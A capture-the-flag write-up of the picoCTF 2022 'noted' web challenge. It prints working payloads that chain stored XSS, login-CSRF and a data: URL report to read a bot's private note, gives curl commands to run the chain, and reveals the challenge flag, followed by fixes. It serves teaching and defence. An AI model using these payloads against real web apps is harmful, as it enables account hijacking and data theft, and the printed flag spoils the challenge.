# noted: picoCTF 2022 (Web, Hard)

> A notes app that "followed all the best practices." It ships stored XSS, a
> CSRF hole on login, and a report bot that types the flag into its own browser.
> Chaining them turns the Same-Origin Policy into an exfiltration channel.

**Category:** Web Exploitation · **Difficulty:** Hard · **Author:** ehhthing
**Stack:** Fastify · EJS · Puppeteer

**Flag:** `picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`

---

## 1. The target

A minimal note-taking app: register, log in, create notes, delete notes. One
extra feature does all the damage: **Report**.

When you submit a URL to `/report`, the server spins up a headless Chrome
(Puppeteer) that behaves like a victim. From `report.js`, that victim:

```js
// 1. registers a brand-new account with random credentials
await page.goto('http://0.0.0.0:8080/register');
await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));
...
// 2. creates a note titled "flag" holding the real flag
await page.goto('http://0.0.0.0:8080/new');
await page.type('[name="title"]', 'flag');
await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');
...
// 3. visits YOUR url, then waits 7.5s
await page.goto('about:blank')
await page.goto(url);
await page.waitForTimeout(7500);
```

So the flag exists: in a note, inside *the bot's* account, in *the bot's*
browser session. Two walls stand between us and it, and the challenge
description hands us the harder one:

- **Cross-account.** Notes are private; you only ever see your own. The flag
  lives in a random account you can't log into.
- **No internet.** *"The headless browser used for the report feature does not
  have access to the internet."* The classic move: pop the flag into a
  `fetch()` to your server: is dead on arrival.

---

## 2. Recon: three bugs that were left in

The app protects note creation and deletion with CSRF tokens and hashes
passwords with argon2. It looks careful. The gaps are precise:

| Bug | Where | What it gives |
|---|---|---|
| **Stored XSS** | `notes.ejs` renders `<%- note.content %>` | The unescaped EJS tag `<%-` injects raw HTML. A note can carry a live `<script>`, but only on your *own* notes page (self-XSS). |
| **No CSRF on login** | `POST /login` in `web.js` | Every other POST calls `fastify.csrfProtection`. Login and register don't, so a foreign page can silently log a browser into *your* account. |
| **Unchecked report sink** | `POST /report` → `page.goto(url)` | Whatever URL you submit is loaded top-level by the victim: including a `data:` URL, which needs no network. |

**The bind:** The XSS is self-only, so it can't read the bot's notes directly.
CSRF-injecting a script into the bot's account is blocked: `/new` is
CSRF-protected and its token lives in the bot's encrypted session, which we
can't read cross-site. We need a way to run *our* JavaScript on the app's origin
*while the flag is on screen.*

---

## 3. The idea: turn the origin into the exfil channel

The Same-Origin Policy isolates by **origin** (scheme + host + port), *not* by
session. Two windows on `http://0.0.0.0:8080` can read each other's DOM even if
one is logged in as the bot and the other as us. That single fact is the whole
exploit.

So we open **two windows on the app's origin** inside the bot's browser:

- A popup named `flag` holding the **bot's** `/notes`: the flag, rendered.
- The top window, which we **log into our own account** via login-CSRF, so
  *our* stored-XSS note executes there.

Both are same-origin, so our script reaches across and reads the flag window's
text. Then: with no internet: it writes the flag into a note *in our account*
(we're logged in as us in that window), and we read it back at our leisure.

```
              Bot browser · headless Chrome · no internet
   ┌───────────────────────────────────────────────────────────────┐
   │                    ┌───────────────────────┐                   │
   │                    │   Reported data: URL  │  origin: null     │
   │                    │      runs our JS      │                   │
   │                    └───────────┬───────────┘                   │
   │       opens popup  ┌───────────┴─────────┐  login-CSRF         │
   │                    ▼                     ▼                      │
   │  ── origin http://0.0.0.0:8080: one origin, two sessions ──   │
   │   ┌───────────────────────┐   ┌───────────────────────────┐   │
   │   │ Popup  name = "flag"  │   │ Top window  /notes        │   │
   │   │ GET /notes            │   │ session: ATTACKER         │   │
   │   │ session: BOT          │◀╌╌│ stored <script> runs here │   │
   │   │  ┌─────────────────┐  │   │  w = open('', 'flag')     │   │
   │   │  │ picoCTF{...}    │  │   │  w.document.body.innerText│   │
   │   │  └─────────────────┘  │   └─────────────┬─────────────┘   │
   │   └───────────────────────┘                 │                  │
   │      same-origin DOM read                   ▼                  │
   │      (SOP permits it: session ignored)  POST /new             │
   │                                    flag saved in OUR account   │
   └───────────────────────────────────────────────────────────────┘
```

The flag is read across two windows that share an origin but not a session.
Everything happens locally in the bot's browser: no packet leaves the machine
until we log in later and read our own note.

---

## 4. Two payloads

The attack is split in two: a **stored note** we plant in our account ahead of
time (the reader), and the **reported page** that stages the two windows (the
driver).

### Payload A: the stored XSS note (the reader)

Sits in our account. When the bot's top window lands on our `/notes`, it runs:
grab the `flag` popup by name, read its text, fetch a fresh CSRF token from
`/new`, and POST the flag back as a new note: all in our own session.

```html
<script>(async function(){
  function post(ti,co){
    return fetch('/new').then(r=>r.text()).then(t=>{
      var c=/name="_csrf" value="([^"]+)"/.exec(t)[1];   // same-origin: token is readable
      return fetch('/new',{method:'POST',
        headers:{'content-type':'application/x-www-form-urlencoded'},
        body:'_csrf='+encodeURIComponent(c)+'&title='+ti+'&content='+encodeURIComponent(co)});
    });
  }
  try{
    var w=window.open('','flag');          // re-grab the already-open popup by name
    await post('GOT',w.document.body.innerText); // same origin => DOM read succeeds
  }catch(e){ await post('ERR',''+e); }
})()</script>
```

### Payload B: the reported `data:` page (the driver)

Origin `null`, so it can't read the app itself: its only jobs are to *open* the
two windows. First the flag popup (bot session, top-level GET → cookies sent).
Then, after a short delay, a login-CSRF form that navigates the top window into
our account, where Payload A is waiting.

```
data:text/html,<script>
  i='http://0.0.0.0:8080';
  open(i+'/notes','flag');              // popup "flag" = bot's notes (bot session)
  setTimeout(function(){                // give the popup time to render
    var f=document.createElement('form');
    f.method='POST'; f.action=i+'/login';  // no CSRF token needed here
    f.innerHTML='<input name=username value=pwn133c9aa2>'+
               '<input name=password value=pw1c7595fa>';
    document.body.appendChild(f); f.submit();  // top window => our /notes => Payload A fires
  },2500)
</script>
```

**Why the timing holds:** the popup opens at `t=0`; login submits at `t=2.5s`;
our XSS runs a moment later and reads a popup that has had seconds to load. The
whole dance finishes inside the bot's `waitForTimeout(7500)` window. And though
logging in as us overwrites the single origin cookie, the popup's DOM is already
rendered: its flag text stays readable.

---

## 5. Running it

```bash
B='http://saturn.picoctf.net:59011'   # instance host:port (yours will differ)

# 1) Register an attacker account (grabs a session cookie)
curl -s -c jar -b jar -X POST $B/register \
  --data-urlencode "username=pwn133c9aa2" --data-urlencode "password=pw1c7595fa"
# -> 302 /notes, Set-Cookie: session=...

# 2) Plant Payload A. GET /new rotates the session cookie, so persist it (-c jar).
CSRF=$(curl -s -c jar -b jar $B/new | grep -oP 'name="_csrf" value="\K[^"]+')
curl -s -c jar -b jar -X POST $B/new \
  --data-urlencode "_csrf=$CSRF" --data-urlencode "title=x" \
  --data-urlencode "content=<script>...payload A...</script>"
# -> 302 /notes  (my notes page now carries one live <script>)

# 3) Report Payload B
CSRF=$(curl -s -c jar -b jar $B/report | grep -oP 'name="_csrf" value="\K[^"]+')
curl -s -c jar -b jar -X POST $B/report \
  --data-urlencode "_csrf=$CSRF" --data-urlencode "url=data:text/html,...payload B..."
# -> "URL has been reported."

# 4) Read your own notes back (poll a few times)
curl -s -c jar -b jar $B/notes | grep -oiE 'picoCTF\{[^}]*\}'
# picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}
```

---

## 6. Why each piece is necessary

- **A `data:` URL, not a hosted page.** The bot has no internet, so the driver
  can't come off a server. `data:text/html` renders straight from the URL: no
  network at all.
- **A named window, not an iframe.** The app's session cookie is `SameSite`-
  restricted, so it wouldn't ride along in a cross-site *frame*. A top-level
  `window.open` navigation is treated as a first-party visit and carries the
  bot's cookie, so the popup really is logged in as the bot.
- **Login-CSRF, not stored-CSRF.** We can't forge a note into the bot's account
  (that POST is token-protected and the token is unreadable cross-site). But
  `/login` has no token, so instead of moving our code to the bot, we move the
  bot to our code.
- **SOP is session-blind.** The read succeeds purely because both windows are
  `http://0.0.0.0:8080`. The browser never asks "are these the same user?": only "the same origin?"
- **Headless has no popup blocker.** `window.open` without a click is normally
  blocked; headless Chrome allows it, so the flag popup opens unattended.

---

## 7. How it should have been built

- **Escape output.** Use EJS `<%= %>` (HTML-escaped) for note title and content.
  This one change kills the reader payload.
- **Protect login and register** with the same CSRF token as every other POST,
  and set the session cookie `SameSite=Strict`. No login-CSRF, no window swap.
- **Ship a Content-Security-Policy**: `script-src 'self'` stops inline
  `<script>` from running even if markup slips through.
- **Constrain the report sink**: allow only `http(s)` URLs on the app's own
  origin, never `data:`.

---

*Public write-ups: [spencerpogo](https://github.com/Scoder12/ctf/blob/main/PicoCTF%202022/web_noted.md)
· [CTFtime](https://ctftime.org/writeup/33118)*
